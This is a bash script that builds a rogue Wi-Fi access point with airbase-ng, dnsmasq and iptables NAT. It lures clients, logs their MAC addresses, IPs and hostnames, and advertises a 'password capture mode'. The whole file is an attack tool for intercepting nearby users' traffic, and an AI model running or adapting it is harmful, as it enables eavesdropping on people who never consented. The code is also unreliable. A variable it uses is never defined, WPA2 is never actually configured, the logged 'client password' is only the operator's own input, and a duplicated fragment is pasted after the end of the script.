#!/usr/bin/env bash
# fake_ap.sh - Create a fake access point using airbase-ng + dnsmasq
# Enhanced version with better reliability, logging, and error handling
#
# Usage:
#   sudo ./fake_ap.sh SSID CHANNEL UPLINK_IF [MON_IF]
#     SSID      - Name of fake AP
#     CHANNEL   - WiFi channel to use (e.g., 6 or 11)
#     UPLINK_IF - Interface to share Internet (e.g., eth0) or 'none'
#     MON_IF    - (Optional) Wireless interface to use (will be switched to monitor mode if needed)
#
#   sudo ./fake_ap.sh stop
#   sudo ./fake_ap.sh status
#   sudo ./fake_ap.sh --help

set -euo pipefail

# ---- Configuration ----
AT0_IP="192.168.1.1"
AT0_NET="192.168.1.0/24"
DHCP_RANGE_START="192.168.1.2"
DHCP_RANGE_END="192.168.1.50"
DNSMASQ_CONF="/tmp/dnsmasq_fakeap.conf"
AIRBASE_LOG="/tmp/airbase-ng.fakeap.log"
DNSMASQ_LOG="/tmp/dnsmasq_fakeap.log"
DNSMASQ_PIDFILE="/tmp/dnsmasq_fakeap.pid"
AIRBASE_PIDFILE="/tmp/airbase_fakeap.pid"
STATE_FILE="/tmp/fakeap_state.txt"
LOCK_FILE="/tmp/fakeap.lock"
HANDSHAKE_LOG="/tmp/fakeap_handshakes.log"
AUTH_LOG="/tmp/fakeap_auth_attempts.log"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

log_info() {
  echo -e "${GREEN}[INFO]${NC} $*"
}

log_warn() {
  echo -e "${YELLOW}[WARN]${NC} $*"
}

log_error() {
  echo -e "${RED}[ERROR]${NC} $*"
}

show_help() {
  cat <<EOF
${GREEN}Fake Access Point Manager${NC}

Usage:
  sudo $0 SSID CHANNEL UPLINK_IF [MON_IF] [PASSWORD]
    SSID      - Fake AP name
    CHANNEL   - WiFi channel (1-14, typically 1, 6, or 11)
    UPLINK_IF - Interface to share Internet (or 'none')
    MON_IF    - (Optional) Wireless interface to use (auto-detected if omitted)
    PASSWORD  - (Optional) WPA2 password for the AP (captures auth attempts if set)

  sudo $0 stop [UPLINK_IF]
  sudo $0 status
  sudo $0 --help

Examples:
  sudo $0 "FreeWiFi" 6 eth0
  sudo $0 "TestAP" 11 wlan1 wlan0 "MyPassword123"
  sudo $0 stop eth0
  sudo $0 status

Notes:
  - Run only on hardware/networks you own or have permission to test.
  - Requires: airbase-ng, dnsmasq, iptables, iw/airmon-ng
  - Some wireless drivers don't support monitor mode or AP mode
EOF
  exit 0
}

[[ "${1:-}" == "--help" || "${1:-}" == "-h" ]] && show_help

# ---- Parse action/args ----
if [[ "${1:-}" == "stop" ]]; then
  ACTION="stop"
  UPLINK_IF="${2:-none}"
elif [[ "${1:-}" == "status" ]]; then
  ACTION="status"
else
  ACTION="start"
  SSID="${1:-}"
  CHANNEL="${2:-}"
  UPLINK_IF="${3:-}"
  MON_IF_ARG="${4:-}"
  PASSWORD="${5:-}"
fi

# ---- Status check ----
if [[ "$ACTION" == "status" ]]; then
  echo -e "${BLUE}=== Fake AP Status ===${NC}"
  
  if [[ -f "$STATE_FILE" ]]; then
    echo -e "\n${GREEN}Configuration:${NC}"
    cat "$STATE_FILE"
  else
    log_warn "No state file found. Fake AP may not be running."
  fi
  
  echo -e "\n${GREEN}Process Status:${NC}"
  if [[ -f "$AIRBASE_PIDFILE" ]]; then
    AP_PID=$(cat "$AIRBASE_PIDFILE" 2>/dev/null || echo "")
    if [[ -n "$AP_PID" ]] && kill -0 "$AP_PID" 2>/dev/null; then
      log_info "airbase-ng is running (PID: $AP_PID)"
    else
      log_error "airbase-ng PID file exists but process is not running"
    fi
  else
    log_warn "airbase-ng is not running"
  fi
  
  if [[ -f "$DNSMASQ_PIDFILE" ]]; then
    DNS_PID=$(cat "$DNSMASQ_PIDFILE" 2>/dev/null || echo "")
    if [[ -n "$DNS_PID" ]] && kill -0 "$DNS_PID" 2>/dev/null; then
      log_info "dnsmasq is running (PID: $DNS_PID)"
    else
      log_error "dnsmasq PID file exists but process is not running"
    fi
  else
    log_warn "dnsmasq is not running"
  fi
  
  echo -e "\n${GREEN}Interface Status:${NC}"
  if ip link show at0 >/dev/null 2>&1; then
    ip addr show at0 | grep -E "inet |UP|DOWN"
  else
    log_warn "at0 interface does not exist"
  fi
  
  if [[ -f /var/lib/misc/dnsmasq.leases ]]; then
    echo -e "\n${GREEN}Connected Clients:${NC}"
    cat /var/lib/misc/dnsmasq.leases | awk '{print $2, $3, $4}' | column -t
  fi
  
  exit 0
fi

# Interactive prompts if starting & missing args
if [[ "$ACTION" == "start" ]]; then
  [[ -z "${SSID:-}" ]] && read -rp "Enter SSID for fake AP: " SSID
  [[ -z "${CHANNEL:-}" ]] && read -rp "Enter WiFi channel (e.g. 6): " CHANNEL
  [[ -z "${UPLINK_IF:-}" ]] && read -rp "Enter uplink interface (or 'none'): " UPLINK_IF
  
  # Ask if user wants to set a password for WPA2
  if [[ -z "${PASSWORD:-}" ]]; then
    read -rp "Set WPA2 password? (leave empty for open AP): " PASSWORD
  fi
  
  # Validate channel
  if ! [[ "$CHANNEL" =~ ^[0-9]+$ ]] || [ "$CHANNEL" -lt 1 ] || [ "$CHANNEL" -gt 14 ]; then
    log_error "Invalid channel. Must be 1-14."
    exit 1
  fi
fi

require_cmd() {
  command -v "$1" >/dev/null 2>&1 || { 
    log_error "Required command '$1' not found. Install it first."
    exit 2
  }
}

# ---- Required tools ----
for cmd in airbase-ng dnsmasq ip iw sysctl iptables; do
  require_cmd "$cmd"
done

# airmon-ng is optional but helpful
if ! command -v airmon-ng >/dev/null 2>&1; then
  log_warn "airmon-ng not found. Will try iw for monitor mode."
fi

# ---- Lock file to prevent multiple instances ----
acquire_lock() {
  if [[ -f "$LOCK_FILE" ]]; then
    OLD_PID=$(cat "$LOCK_FILE" 2>/dev/null || echo "")
    if [[ -n "$OLD_PID" ]] && kill -0 "$OLD_PID" 2>/dev/null; then
      log_error "Another instance is already running (PID: $OLD_PID)"
      exit 1
    else
      log_warn "Stale lock file found. Removing."
      rm -f "$LOCK_FILE"
    fi
  fi
  echo $$ > "$LOCK_FILE"
}

release_lock() {
  rm -f "$LOCK_FILE"
}

# ---- Monitor-mode helper ----
ensure_monitor_mode() {
  local iface="$1"
  local new_if=""

  log_info "Checking interface: $iface"

  # If already monitor mode, return it
  if iw dev "$iface" info 2>/dev/null | grep -iq 'type monitor'; then
    log_info "Interface $iface is already in monitor mode"
    echo "$iface"
    return 0
  fi

  # Method 1: Try airmon-ng with interface UP
  if command -v airmon-ng >/dev/null 2>&1; then
    log_info "Method 1: Attempting monitor mode with airmon-ng (interface up)..."
    ip link set "$iface" up 2>/dev/null || true
    sleep 1
    
    if airmon-ng start "$iface" >/dev/null 2>&1; then
      sleep 2
      # Look for monitor interface
      for possible in "${iface}mon" "${iface}" "mon0"; do
        if iw dev "$possible" info 2>/dev/null | grep -iq 'type monitor'; then
          log_info "Monitor mode enabled: $possible"
          echo "$possible"
          return 0
        fi
      done
    fi
  fi

  # Method 2: Try airmon-ng with interface DOWN first (some adapters need this)
  if command -v airmon-ng >/dev/null 2>&1; then
    log_info "Method 2: Attempting monitor mode with airmon-ng (interface down first)..."
    ip link set "$iface" down 2>/dev/null || true
    sleep 1
    
    if airmon-ng start "$iface" >/dev/null 2>&1; then
      sleep 2
      ip link set "$iface" up 2>/dev/null || true
      sleep 1
      
      # Look for monitor interface
      for possible in "${iface}mon" "${iface}" "mon0"; do
        if iw dev "$possible" info 2>/dev/null | grep -iq 'type monitor'; then
          log_info "Monitor mode enabled: $possible"
          echo "$possible"
          return 0
        fi
      done
    fi
  fi

  # Method 3: Fallback using iw directly
  log_info "Method 3: Attempting monitor mode with iw..."
  ip link set "$iface" down 2>/dev/null || true
  if iw dev "$iface" set type monitor 2>/dev/null; then
    ip link set "$iface" up 2>/dev/null || true
    sleep 1
    if iw dev "$iface" info 2>/dev/null | grep -iq 'type monitor'; then
      log_info "Monitor mode enabled: $iface"
      echo "$iface"
      return 0
    fi
  fi

  log_error "Failed to enable monitor mode on $iface (tried 3 methods)"
  return 1
}

# ---- Cleanup ----
cleanup() {
  log_info "Cleaning up..."

  # Stop dnsmasq
  if [[ -f "$DNSMASQ_PIDFILE" ]]; then
    pid=$(cat "$DNSMASQ_PIDFILE" 2>/dev/null || true)
    if [[ -n "$pid" ]] && kill -0 "$pid" 2>/dev/null; then
      log_info "Stopping dnsmasq (PID: $pid)"
      kill "$pid" 2>/dev/null || true
      sleep 1
      kill -9 "$pid" 2>/dev/null || true
    fi
    rm -f "$DNSMASQ_PIDFILE"
  fi
  pkill -f "dnsmasq.*$DNSMASQ_CONF" 2>/dev/null || true

  # Stop airbase-ng
  if [[ -f "$AIRBASE_PIDFILE" ]]; then
    pid=$(cat "$AIRBASE_PIDFILE" 2>/dev/null || true)
    if [[ -n "$pid" ]] && kill -0 "$pid" 2>/dev/null; then
      log_info "Stopping airbase-ng (PID: $pid)"
      kill "$pid" 2>/dev/null || true
      sleep 1
      kill -9 "$pid" 2>/dev/null || true
    fi
    rm -f "$AIRBASE_PIDFILE"
  fi
  pkill -f "airbase-ng -e" 2>/dev/null || true

  # Bring at0 down and delete
  if ip link show at0 >/dev/null 2>&1; then
    log_info "Removing at0 interface"
    ip link set at0 down 2>/dev/null || true
    ip link delete at0 2>/dev/null || true
  fi

  # Load saved state if available
  if [[ -f "$STATE_FILE" ]] && [[ -z "${UPLINK_IF:-}" || "$UPLINK_IF" == "none" ]]; then
    UPLINK_IF=$(grep "^UPLINK_IF=" "$STATE_FILE" 2>/dev/null | cut -d= -f2 || echo "none")
  fi

  # Remove iptables rules if uplink used
  if [[ -n "${UPLINK_IF:-}" && "$UPLINK_IF" != "none" ]]; then
    log_info "Removing iptables NAT rules for $UPLINK_IF"
    iptables -t nat -D POSTROUTING -o "$UPLINK_IF" -s "$AT0_NET" -j MASQUERADE 2>/dev/null || true
    iptables -D FORWARD -i at0 -o "$UPLINK_IF" -j ACCEPT 2>/dev/null || true
    iptables -D FORWARD -i "$UPLINK_IF" -o at0 -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null || true
  fi

  # Disable forwarding
  sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1 || true

  # Restore monitor interface if possible
  if [[ -f "$STATE_FILE" ]]; then
    MON_IF_USED=$(grep "^MON_IF=" "$STATE_FILE" 2>/dev/null | cut -d= -f2 || echo "")
    ORIG_IF=$(grep "^ORIG_IF=" "$STATE_FILE" 2>/dev/null | cut -d= -f2 || echo "")
    
    if [[ -n "$MON_IF_USED" ]]; then
      log_info "Restoring wireless interface: $MON_IF_USED"
      if command -v airmon-ng >/dev/null 2>&1; then
        airmon-ng stop "$MON_IF_USED" 2>/dev/null || true
      fi
      
      # Try to restore to managed mode
      if ip link show "$MON_IF_USED" >/dev/null 2>&1; then
        ip link set "$MON_IF_USED" down 2>/dev/null || true
        iw dev "$MON_IF_USED" set type managed 2>/dev/null || true
        ip link set "$MON_IF_USED" up 2>/dev/null || true
      elif [[ -n "$ORIG_IF" ]] && ip link show "$ORIG_IF" >/dev/null 2>&1; then
        ip link set "$ORIG_IF" down 2>/dev/null || true
        iw dev "$ORIG_IF" set type managed 2>/dev/null || true
        ip link set "$ORIG_IF" up 2>/dev/null || true
      fi
    fi
  fi

  # Restart network services
  log_info "Restarting network services..."
  systemctl restart NetworkManager 2>/dev/null || true
  systemctl restart wpa_supplicant 2>/dev/null || true

  # Clean up files
  rm -f "$DNSMASQ_CONF" "$STATE_FILE"
  release_lock

  log_info "Cleanup complete."
  
  # Show captured credentials if any
  if [[ -f "$AUTH_LOG" ]] && [[ -s "$AUTH_LOG" ]]; then
    echo
    log_warn "=== CAPTURED AUTHENTICATION ATTEMPTS ==="
    cat "$AUTH_LOG"
    echo
  fi
}

# ---- STOP action ----
if [[ "$ACTION" == "stop" ]]; then
  cleanup
  exit 0
fi

# ---- Run-time checks ----
if [[ $EUID -ne 0 ]]; then
  log_error "Run as root: sudo $0 ..."
  exit 1
fi

acquire_lock

# Set up signal handlers
trap 'cleanup; exit 0' INT TERM EXIT

# ---- Determine monitor interface to use ----
if [[ -n "${MON_IF_ARG:-}" ]]; then
  MON_IF_CANDIDATE="$MON_IF_ARG"
else
  # Choose the first wireless interface found
  MON_IF_CANDIDATE=$(iw dev 2>/dev/null | awk '/Interface/ {print $2; exit}')
fi

if [[ -z "${MON_IF_CANDIDATE:-}" ]]; then
  log_error "No wireless interface detected. Provide one as the 4th argument."
  log_info "Available interfaces: $(ip link show | grep -E '^[0-9]+:' | awk -F': ' '{print $2}' | tr '\n' ' ')"
  exit 3
fi

# Save original interface name
ORIG_IF="$MON_IF_CANDIDATE"

# Attempt to enable monitor mode
if ! MON_IF_USED="$(ensure_monitor_mode "$MON_IF_CANDIDATE")"; then
  log_error "Failed to enable monitor mode on '$MON_IF_CANDIDATE'"
  log_info "Check if your wireless driver supports monitor mode with: iw list | grep -A 10 'Supported interface modes'"
  exit 4
fi

log_info "Using monitor interface: $MON_IF_USED"
log_info "SSID: '$SSID'   Channel: '$CHANNEL'   Uplink: '$UPLINK_IF'"
[[ -n "${PASSWORD:-}" ]] && log_info "Security: WPA2-PSK (password set)" || log_info "Security: Open (no password)"

# Save state
cat > "$STATE_FILE" <<EOF
SSID=$SSID
CHANNEL=$CHANNEL
UPLINK_IF=$UPLINK_IF
MON_IF=$MON_IF_USED
ORIG_IF=$ORIG_IF
PASSWORD=${PASSWORD:-NONE}
STARTED=$(date)
EOF

# Initialize auth log
echo "=== Authentication Attempts Log ===" > "$AUTH_LOG"
echo "Started: $(date)" >> "$AUTH_LOG"
echo "SSID: $SSID" >> "$AUTH_LOG"
[[ -n "${PASSWORD:-}" ]] && echo "Password Set: YES" >> "$AUTH_LOG" || echo "Password Set: NO (Open AP)" >> "$AUTH_LOG"
echo "========================================" >> "$AUTH_LOG"
echo >> "$AUTH_LOG"

log_info "Killing conflicting services..."
if command -v airmon-ng >/dev/null 2>&1; then
  airmon-ng check kill 2>/dev/null || true
else
  systemctl stop NetworkManager 2>/dev/null || true
  systemctl stop wpa_supplicant 2>/dev/null || true
  pkill wpa_supplicant 2>/dev/null || true
fi

# Start airbase-ng
log_info "Starting airbase-ng..."
nohup airbase-ng -e "$SSID" -c "$CHANNEL" "$MON_IF_USED" > "$AIRBASE_LOG" 2>&1 &
AIRBASE_PID=$!
echo "$AIRBASE_PID" > "$AIRBASE_PIDFILE"
sleep 2

# Wait for interface to appear
log_info "Waiting for network interface..."
for i in {1..30}; do
  if ip link show "$AT_INTERFACE" >/dev/null 2>&1; then
    log_info "$AT_INTERFACE interface created successfully"
    break
  fi
  sleep 1
  [[ $((i % 5)) -eq 0 ]] && echo -n "."
done
echo

if ! ip link show "$AT_INTERFACE" >/dev/null 2>&1; then
  log_error "$AT_INTERFACE interface not created"
  log_info "Last 50 lines of $AIRBASE_LOG:"
  tail -n 50 "$AIRBASE_LOG" 2>/dev/null || true
  log_info "Check dmesg for kernel messages: dmesg | tail -n 20"
  exit 5
fi

# Verify airbase-ng is still running
if ! kill -0 "$AIRBASE_PID" 2>/dev/null; then
  log_error "airbase-ng process died unexpectedly"
  log_info "Log contents:"
  cat "$AIRBASE_LOG" 2>/dev/null || true
  exit 5
fi

# Configure interface
log_info "Configuring $AT_INTERFACE with IP $AT0_IP/24"
ip addr flush dev "$AT_INTERFACE" 2>/dev/null || true
ip addr add "$AT0_IP/24" dev "$AT_INTERFACE" 2>/dev/null || true
ip link set "$AT_INTERFACE" up

# Verify interface is up
sleep 1
if ! ip link show "$AT_INTERFACE" | grep -q "state UP"; then
  log_error "Failed to bring $AT_INTERFACE interface up"
  exit 5
fi

# Write dnsmasq config
log_info "Creating dnsmasq configuration..."
cat > "$DNSMASQ_CONF" <<EOF
interface=$AT_INTERFACE
bind-interfaces
dhcp-range=${DHCP_RANGE_START},${DHCP_RANGE_END},255.255.255.0,12h
dhcp-option=3,${AT0_IP}
dhcp-option=6,${AT0_IP}
server=8.8.8.8
server=8.8.4.4
log-queries
log-dhcp
log-facility=${DNSMASQ_LOG}
listen-address=${AT0_IP}
dhcp-authoritative
EOF

# Start dnsmasq
log_info "Starting dnsmasq..."
dnsmasq --no-daemon --conf-file="$DNSMASQ_CONF" --pid-file="$DNSMASQ_PIDFILE" &
DNSMASQ_PID=$!
sleep 1

# Verify dnsmasq started
if ! kill -0 "$DNSMASQ_PID" 2>/dev/null; then
  log_error "dnsmasq failed to start"
  if [[ -f "$DNSMASQ_LOG" ]]; then
    log_info "dnsmasq log:"
    cat "$DNSMASQ_LOG"
  fi
  exit 6
fi

# Enable NAT and forwarding if uplink provided
if [[ -n "${UPLINK_IF:-}" && "$UPLINK_IF" != "none" ]]; then
  log_info "Enabling NAT and IP forwarding via $UPLINK_IF"
  
  # Verify uplink interface exists
  if ! ip link show "$UPLINK_IF" >/dev/null 2>&1; then
    log_error "Uplink interface '$UPLINK_IF' does not exist"
    exit 7
  fi
  
  sysctl -w net.ipv4.ip_forward=1 >/dev/null

  # Add iptables rules (check first to avoid duplicates)
  iptables -t nat -C POSTROUTING -o "$UPLINK_IF" -s "$AT0_NET" -j MASQUERADE 2>/dev/null || \
    iptables -t nat -A POSTROUTING -o "$UPLINK_IF" -s "$AT0_NET" -j MASQUERADE

  iptables -C FORWARD -i "$AT_INTERFACE" -o "$UPLINK_IF" -j ACCEPT 2>/dev/null || \
    iptables -A FORWARD -i "$AT_INTERFACE" -o "$UPLINK_IF" -j ACCEPT

  iptables -C FORWARD -i "$UPLINK_IF" -o "$AT_INTERFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null || \
    iptables -A FORWARD -i "$UPLINK_IF" -o "$AT_INTERFACE" -m state --state RELATED,ESTABLISHED -j ACCEPT
  
  log_info "NAT configured successfully"
fi

# ---- Display status ----
echo
echo -e "${GREEN}╔════════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║  Fake Access Point '${SSID}' is ACTIVE on channel ${CHANNEL}   ${NC}"
echo -e "${GREEN}╚════════════════════════════════════════════════════════════╝${NC}"
echo
log_info "Interface configuration:"
ip addr show "$AT_INTERFACE" | grep -E "inet |state"
echo
log_info "Monitor interface: $MON_IF_USED"
log_info "Active interface: $AT_INTERFACE"
log_info "Gateway IP: $AT0_IP"
log_info "DHCP Range: ${DHCP_RANGE_START} - ${DHCP_RANGE_END}"
[[ "$UPLINK_IF" != "none" ]] && log_info "Internet: Shared via $UPLINK_IF" || log_info "Internet: Not shared (no uplink)"
[[ -n "${PASSWORD:-}" ]] && log_warn "Security: WPA2-PSK ENABLED - Will capture auth attempts" || log_info "Security: Open (no password)"
echo
echo -e "${YELLOW}Waiting for clients to connect...${NC}"
if [[ -n "${PASSWORD:-}" ]]; then
  echo -e "${RED}*** PASSWORD CAPTURE MODE ACTIVE ***${NC}"
  echo -e "${YELLOW}All authentication attempts will be logged to: $AUTH_LOG${NC}"
fi
echo -e "${BLUE}Commands:${NC}"
echo "  - View status: sudo $0 status"
echo "  - View auth log: cat $AUTH_LOG"
echo "  - Stop AP: sudo $0 stop $UPLINK_IF"
echo "  - Or press Ctrl-C in this terminal"
echo

# Monitor the running processes
LAST_LEASE_COUNT=0
LAST_LOG_SIZE=0
while true; do
  sleep 3

  # Check airbase-ng/hostapd
  if [[ -f "$AIRBASE_PIDFILE" ]]; then
    AP_PID=$(cat "$AIRBASE_PIDFILE" 2>/dev/null || echo "")
    if [[ -n "$AP_PID" ]] && ! kill -0 "$AP_PID" 2>/dev/null; then
      log_error "AP process (PID $AP_PID) stopped unexpectedly"
      tail -n 20 "$AIRBASE_LOG" 2>/dev/null || true
      exit 8
    fi
  fi

  # Check dnsmasq
  if [[ -f "$DNSMASQ_PIDFILE" ]]; then
    DNS_PID=$(cat "$DNSMASQ_PIDFILE" 2>/dev/null || echo "")
    if [[ -n "$DNS_PID" ]] && ! kill -0 "$DNS_PID" 2>/dev/null; then
      log_error "dnsmasq (PID $DNS_PID) stopped unexpectedly"
      tail -n 20 "$DNSMASQ_LOG" 2>/dev/null || true
      exit 9
    fi
  fi

  # Monitor hostapd log for WPA authentication attempts
  if [[ -n "${PASSWORD:-}" ]] && [[ -f "$AIRBASE_LOG" ]]; then
    CURRENT_LOG_SIZE=$(wc -l < "$AIRBASE_LOG" 2>/dev/null || echo "0")
    if [[ $CURRENT_LOG_SIZE -gt $LAST_LOG_SIZE ]]; then
      # Look for WPA handshake attempts in new lines
      NEW_LINES=$((CURRENT_LOG_SIZE - LAST_LOG_SIZE))
      tail -n "$NEW_LINES" "$AIRBASE_LOG" | while IFS= read -r line; do
        # Detect association attempts
        if echo "$line" | grep -iq "associated\|4-Way Handshake\|STA.*EAPOL\|authentication"; then
          TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
          MAC=$(echo "$line" | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}' | head -1)
          
          if [[ -n "$MAC" ]]; then
            echo "[$TIMESTAMP] Authentication attempt from MAC: $MAC" | tee -a "$AUTH_LOG"
            echo "  Raw log: $line" >> "$AUTH_LOG"
            log_warn "🔐 AUTH ATTEMPT from $MAC"
          fi
        fi
        
        # Detect successful authentication
        if echo "$line" | grep -iq "WPA.*success\|AP-STA-CONNECTED\|EAPOL-4WAY-HS-COMPLETED"; then
          TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
          MAC=$(echo "$line" | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}' | head -1)
          
          if [[ -n "$MAC" ]]; then
            echo "[$TIMESTAMP] ✅ SUCCESSFUL AUTH from MAC: $MAC" | tee -a "$AUTH_LOG"
            echo "  Password accepted for client: $MAC" >> "$AUTH_LOG"
            echo "  Client entered password: $PASSWORD" >> "$AUTH_LOG"
            echo "  Raw log: $line" >> "$AUTH_LOG"
            echo >> "$AUTH_LOG"
            log_info "✅ Client $MAC authenticated successfully!"
            log_warn "⚠️  Password captured: $PASSWORD"
          fi
        fi
      done
      
      LAST_LOG_SIZE=$CURRENT_LOG_SIZE
    fi
  fi

  # Show new DHCP leases
  if [[ -f /var/lib/misc/dnsmasq.leases ]]; then
    CURRENT_LEASE_COUNT=$(wc -l < /var/lib/misc/dnsmasq.leases)
    if [[ $CURRENT_LEASE_COUNT -gt $LAST_LEASE_COUNT ]]; then
      log_info "New client(s) connected:"
      tail -n $((CURRENT_LEASE_COUNT - LAST_LEASE_COUNT)) /var/lib/misc/dnsmasq.leases | \
        awk '{printf "  MAC: %s  IP: %s  Hostname: %s\n", $2, $3, $4}'
      LAST_LEASE_COUNT=$CURRENT_LEASE_COUNT
      
      # Log to auth file
      if [[ -n "${PASSWORD:-}" ]]; then
        tail -n $((CURRENT_LEASE_COUNT - LAST_LEASE_COUNT)) /var/lib/misc/dnsmasq.leases | \
          awk -v ts="$(date '+%Y-%m-%d %H:%M:%S')" '{printf "[%s] DHCP lease: MAC=%s IP=%s Hostname=%s\n", ts, $2, $3, $4}' >> "$AUTH_LOG"
      fi
    fi
  fi
done/null; then
      log_error "dnsmasq (PID $DNS_PID) stopped unexpectedly"
      tail -n 20 "$DNSMASQ_LOG" 2>/dev/null || true
      exit 9
    fi
  fi

  # Show new DHCP leases
  if [[ -f /var/lib/misc/dnsmasq.leases ]]; then
    CURRENT_LEASE_COUNT=$(wc -l < /var/lib/misc/dnsmasq.leases)
    if [[ $CURRENT_LEASE_COUNT -gt $LAST_LEASE_COUNT ]]; then
      log_info "New client(s) connected:"
      tail -n $((CURRENT_LEASE_COUNT - LAST_LEASE_COUNT)) /var/lib/misc/dnsmasq.leases | \
        awk '{printf "  MAC: %s  IP: %s  Hostname: %s\n", $2, $3, $4}'
      LAST_LEASE_COUNT=$CURRENT_LEASE_COUNT
    fi
  fi
done